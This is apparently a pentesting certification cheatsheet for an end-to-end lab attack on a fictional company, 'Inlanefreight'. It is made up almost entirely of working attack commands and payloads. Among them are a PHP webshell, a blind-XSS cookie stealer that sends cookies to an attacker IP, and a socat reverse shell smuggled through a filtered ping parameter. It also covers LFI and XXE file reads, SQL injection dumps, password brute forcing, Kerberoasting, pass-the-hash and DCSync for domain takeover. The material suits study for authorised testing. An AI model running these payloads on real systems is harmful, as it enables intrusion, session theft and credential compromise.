---
title: "Attacking Enterprise Networks"
description: "End-to-end corporate pentesting workflow."
sidebar:
  order: 2
  label: "Attacking Enterprise Networks"
---
> Capstone module of the CPTS path. Simulates a complete external + internal pentest against Inlanefreight. Integrates all previous modules into an end-to-end attack chain: external recon → web exploitation → foothold → pivoting → AD compromise.

---

## Phase 1 — External Recon

### Initial Nmap

```bash
# Quick scan (top 1000)
sudo nmap --open -oA target_tcp_1k -iL scope

# Full scan with service detection
sudo nmap --open -p- -A -oA target_tcp_all_svc -iL scope

# Extract unique services from the .gnmap
egrep -v "^#|Status: Up" target_tcp_all_svc.gnmap | cut -d ' ' -f4- | tr ',' '\n' | \
  sed -e 's/^[ \t]*//' | awk -F '/' '{print $7}' | grep -v "^$" | sort | uniq -c | sort -k 1 -nr
```

### DNS Zone Transfer

```bash
dig axfr DOMAIN.local @TARGET_IP
# If it fails → subdomain brute force
```

### vHost Fuzzing with ffuf

```bash
# 1. Determine size of invalid response
curl -s -I http://TARGET_IP -H "HOST: defnotvalid.domain.local" | grep "Content-Length:"
# → note the size (e.g., 15157)

# 2. Fuzz vhosts filtering by that size
ffuf -w /opt/useful/seclists/Discovery/DNS/namelist.txt:FUZZ \
  -u http://TARGET_IP/ \
  -H 'Host:FUZZ.domain.local' \
  -fs 15157

# 3. Add all of them to /etc/hosts
sudo tee -a /etc/hosts > /dev/null <<EOT
TARGET_IP domain.local sub1.domain.local sub2.domain.local sub3.domain.local
EOT
```

---

## Phase 2 — Service Enumeration

### FTP

```bash
ftp TARGET_IP        # try: anonymous (blank password)
ftp> ls              # list files
ftp> put test.txt    # test write access
# vsftpd 3.0.3 → only known exploit is DoS (out of scope)
```

### SMTP — User Enumeration

```bash
telnet TARGET_IP 25
VRFY root            # 252 = exists | 550 = does not exist

# Automate with smtp-user-enum
smtp-user-enum -M VRFY -U /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt \
  -t TARGET_IP

# Check Open Relay
nmap -p25 -Pn --script smtp-open-relay TARGET_IP
```

### rpcbind

```bash
rpcinfo TARGET_IP    # enumerate RPC services
# → Low finding: unnecessary service exposed externally
```

---

## Phase 3 — Web Enumeration

### EyeWitness (Screenshot of All Apps)

```bash
# Create subdomain list
cat subdomains.txt  # one per line

eyewitness -f subdomains.txt -d CLIENT_subdomain_EyeWitness
# → review the HTML report to prioritize targets
```

### Directory Brute-Force (Gobuster)

```bash
gobuster dir -u http://TARGET/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x .php -t 300

# Interpret codes:
# 200 → exists and accessible
# 301/302 → redirect (follow)
# 403 → exists but forbidden (report and try bypass)
```

---

## Phase 4 — Web Exploitation

### File Upload + HTTP Verb Tampering (dev.domain.local)

```bash
# 1. Discover allowed methods
curl -s -I -X OPTIONS http://dev.domain.local/upload.php

# 2. Use TRACK + X-Custom-IP-Authorization header for bypass
# In Burp Repeater:
# Method: TRACK
# Header: X-Custom-IP-Authorization: 127.0.0.1
# → response shows the upload form

# 3. Upload webshell as image (bypass Content-Type)
# Content-Type: image/png ← change in Burp
# Filename: random_hash.php
# Content: <?php system($_GET['cmd']); ?>

# 4. Execute
curl "http://dev.domain.local/uploads/HASH.php?cmd=id"
```

### WordPress — Enum + Brute + Shell

```bash
# Enumerate version and plugins
sudo wpscan -e ap -t 500 --url http://wp.domain.local

# Enumerate users
wpscan -e u -t 500 --url http://wp.domain.local

# Brute force passwords
wpscan --url http://wp.domain.local \
  -P /opt/useful/seclists/Passwords/Common-Credentials/darkweb2017_top-100.txt \
  -U ilfreightwp

# → Login → wp-admin → Theme Editor → 404.php (inactive theme) → webshell
# URL: /wp-admin/theme-editor.php?file=404.php&theme=twentytwenty
```

### Manual SQLi + sqlmap (status.domain.local)

```sql
-- Basic test
'
-- UNION payload
' union select null, database(), user(), @@version -- //
```

```bash
# sqlmap with captured Burp request (mark parameter with *)
sqlmap -r sqli.txt --dbms=mysql
sqlmap -r sqli.txt --dbms=mysql --dbs
sqlmap -r sqli.txt --dbms=mysql -D STATUS_DB --tables
sqlmap -r sqli.txt --dbms=mysql -D STATUS_DB -T users --dump
```

### LFI in WordPress Plugin (mail-masta 1.0)

```bash
curl "http://wp.domain.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

### Blind XSS → Session Hijacking (support.domain.local)

```bash
# 1. Create index.php (cookie logger)
cat > index.php << 'EOF'
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
EOF

# 2. Create script.js
echo "new Image().src='http://OUR_IP:9200/index.php?c='+document.cookie" > script.js

# 3. Start PHP server
sudo php -S 0.0.0.0:9200

# 4. Payload in the ticket/comment:
# "><script src=http://OUR_IP:9200/script.js></script>

# 5. Use the stolen cookie with Cookie-Editor (Firefox extension)
```

---

## SSRF via HTML Injection in PDF Generator (tracking.domain.local)

```javascript
// Payload for local file read via XHR in PDF
<script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)};
x.open("GET","file:///etc/passwd");
x.send();
</script>
```

### XXE Injection (shopdev2.domain.local)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE userid [
  <!ENTITY xxetest SYSTEM "file:///etc/passwd">
]>
<root>
    <subtotal>undefined</subtotal>
    <userid>&xxetest;</userid>
</root>
```

### Open GitLab → Discover Internal vHosts

```bash
# 1. Register account → /explore → view public projects
# 2. Check repos for: config files, SSH keys, passwords, new hostnames
# 3. Add discovered subdomains to /etc/hosts and continue enumeration
```

### Hydra — Brute Force HTTP Form (monitoring.domain.local)

```bash
hydra -l admin -P passwords.txt monitoring.domain.local \
  http-post-form "/login.php:username=admin&password=^PASS^:Invalid Credentials!"
```

### Command Injection with Filters (monitoring.domain.local)

```bash
# Filter bypass: newline (%0A) + single quotes + ${IFS}
curl "http://monitoring.domain.local/ping.php?ip=127.0.0.1%0a'i'd"
# → uid=1004(webdev)

# Socat reverse shell (when nc/curl/wget are filtered)
# Verify that socat exists:
curl "http://monitoring.domain.local/ping.php?ip=127.0.0.1%0a'w'h'i'ch${IFS}socat"

# Listener on Kali:
nc -nvlp 8443

# Payload in Burp (GET request):
GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:OUR_IP:8443${IFS}EXEC:bash HTTP/1.1
```

---

## Phase 5 — Foothold & Shell Upgrade

### Full Interactive Socat TTY

```bash
# On Kali (full TTY listener):
socat file:`tty`,raw,echo=0 tcp-listen:4443

# On target (from basic reverse shell):
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:OUR_IP:4443
```

### adm Group → Credential Hunting in Audit Logs

```bash
# If the user is in the adm group → read audit logs
id | grep adm

# Extract TTY keystroke logging (searching for creds)
aureport --tty | less
# → Look for: typed passwords in su, sudo commands

# Also check:
cat /var/log/auth.log | grep -i "password\|login"
```

---

## Phase 6 — Pivoting to the Interior

```bash
# Verify IPs of the compromised host
hostname -I
ifconfig

# Tunnel setup (from DMZ host → internal network)
# Option 1: Chisel
# On Kali:
./chisel server -p 8080 --reverse

# On target:
./chisel client OUR_IP:8080 R:socks

# Configure proxychains: socks5 127.0.0.1 1080
# Option 2: ligolo-ng (see [Pivoting, Tunneling, and Port Forwarding](/en/metodologias/pivoting/pivoting-tunneling-port-forwarding/))

# Scan internal network through the tunnel
proxychains nmap -sT -p 22,80,445,3389,5985 172.16.8.0/23 --open
```

---

## Phase 7 — Internal AD Enumeration & Attacks

### Initial Enumeration

```bash
# CME — identify hosts and users
proxychains crackmapexec smb 172.16.8.0/23 --gen-relay-list smb_hosts.txt

# BloodHound
proxychains bloodhound-python -u USER -p PASS \
  -d DOMAIN.LOCAL -ns DC_IP -c All

# Key BloodHound queries:
# - Shortest Paths to Domain Admins
# - Kerberoastable Users
# - AS-REP Roastable Users
# - Find All Paths from X to Domain Admin
```

### Kerberoasting

```bash
proxychains GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP -request
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
```

### Pass-the-Hash / Pass-the-Ticket

```bash
# PTH with CME
proxychains crackmapexec smb TARGET -u Admin -H HASH

# PTT with Rubeus (on Windows)
.\Rubeus.exe dump /luid:0x1a8b19 /service:krbtgt
.\Rubeus.exe ptt /ticket:BASE64_TICKET
klist
```

### DCSync → Domain Compromise

```bash
# With Mimikatz (on Windows)
lsadump::dcsync /user:DOMAIN\Administrator

# With secretsdump (on Kali, via proxychains)
proxychains secretsdump.py DOMAIN/Administrator@DC_IP \
  -hashes :HASH -just-dc-ntlm
```

---

## Typical External PT Findings Map

| Finding | Severity | Source |
|---------|----------|--------|
| FTP Anonymous Login | Medium | FTP |
| SMTP VRFY User Enum | Low | SMTP |
| rpcbind Exposed | Low | rpcbind/111 |
| HTTP Verb Tampering | High | dev.app/upload |
| Unrestricted File Upload | High | dev.app/upload |
| LFI WordPress (mail-masta) | High | WordPress plugin |
| Weak WordPress Credentials | High | WordPress |
| IDOR | Medium | careers.app |
| SQL Injection | High | status.app |
| Blind XSS → Session Hijack | High | support.app |
| SSRF → Local File Read | High | tracking.app |
| GitLab Misconfigured | High | gitlab.app |
| XXE Injection | High | shopdev2.app |
| Command Injection | Critical | monitoring.app |
| Directory Listing Enabled | Low | dev.app/uploads |
| Drupal Unhardened (unused) | Informational | blog.app |
| Unnecessary Exposed Services | Low | rpcbind, smtp |

---

## Pitfalls / Gotchas

- **EyeWitness before manual scans:** on large scopes, EyeWitness saves hours. Review the full report before going app-by-app.
- **GitLab as a source of vhosts:** public repos can reveal internal hostnames not found via DNS/ffuf.
- **Content-Type bypass in uploads:** changing only the `Content-Type` header in Burp might be enough if the validation is client-side.
- **Command injection with filters:** always read the filtering code if you can (LFI, file read). It saves a lot of guessing time.
- **socat vs nc:** when `nc`, `curl`, and `wget` are blocked by filters, `socat` is often present. Alternatively, `python3 -c` can be used.
- **adm group → audit logs:** always check the user's groups after obtaining a foothold. `adm` = full access to `/var/log`.
- **aureport:** when the user has access to audit logs, TTY keystroke logs may contain passwords typed by other users.
- **Scope creep in External PT:** do not dive deep into minor vulnerabilities (HTTP headers, missing cookie flags) unless there are no serious findings. Prioritize RCE and data exposure.
- **Phishing is out of scope by default:** confirm it in the SoW. Do not assume it is allowed.
- **vsFTPd DoS:** the only known CVE is a DoS — always out of scope. Do not try it.
- **DNS zone transfer first:** before running `ffuf`, always attempt a zone transfer. It is faster and more complete.
- **Measure efficiency:** automation is only good if you capture everything. Spot-check results from automated tools.

---

## Related Cheatsheets

- [Network Enumeration with Nmap](/en/metodologias/recon/network-enumeration-nmap/) — initial external scans
- [Information Gathering - Web Edition](/en/metodologias/recon/information-gathering-web/) — subdomains, vhosts
- [Attacking Common Applications](/en/metodologias/web/attacking-common-applications/) — WordPress, GitLab, Tomcat
- [Command Injections](/en/metodologias/web/command-injections/) — filter bypass, evasion
- [File Upload Attacks](/en/metodologias/web/file-upload-attacks/) — content-type bypass, polyglots
- [Web Attacks](/en/metodologias/web/web-attacks/) — XXE, IDOR, HTTP verb tampering
- [Pivoting, Tunneling, and Port Forwarding](/en/metodologias/pivoting/pivoting-tunneling-port-forwarding/) — pivoting to the interior
- [Active Directory Enumeration & Attacks](/en/metodologias/active-directory/active-directory-enumeration-attacks/) — internal phase
- [Documentation & Reporting](/en/metodologias/fundamentos/documentation-reporting/) — document the entire engagement
